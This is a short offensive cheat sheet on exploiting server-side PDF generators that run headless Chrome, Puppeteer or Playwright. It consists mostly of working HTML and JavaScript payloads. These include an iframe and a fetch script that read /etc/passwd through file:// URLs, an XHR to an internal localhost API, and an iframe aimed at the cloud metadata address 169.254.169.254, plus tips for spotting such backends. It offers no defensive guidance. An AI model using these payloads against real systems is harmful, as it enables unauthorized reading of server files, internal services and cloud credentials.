# Headless Chrome PDF SSRF for Local File Read

When an app generates PDFs from user-supplied HTML/URLs using a headless browser (Puppeteer, Playwright, Chrome), the browser runs with access to the server's filesystem and internal network.

## Read local files

Inject HTML into the PDF input with a `file://` reference:
```html
<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
```

Or an `<img>` + `<script>` approach if iframes are blocked:
```html
<script>
  fetch('file:///etc/passwd').then(r=>r.text()).then(t=>{
    document.write('<pre>'+t+'</pre>');
  });
</script>
```

## Read via XHR to internal services

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost:3000/api/internal', false);
xhr.send();
document.write(xhr.responseText);
</script>
```

## Detect headless browser

Look for headers:  
- `X-Powered-By: Puppeteer`  
- Content-Type `application/pdf` from a POST with HTML body  
- Response time > 2s for PDF generation  

## Combined: SSRF to read environment / metadata

```html
<iframe src="http://169.254.169.254/latest/meta-data/" width="1000" height="500"></iframe>
```
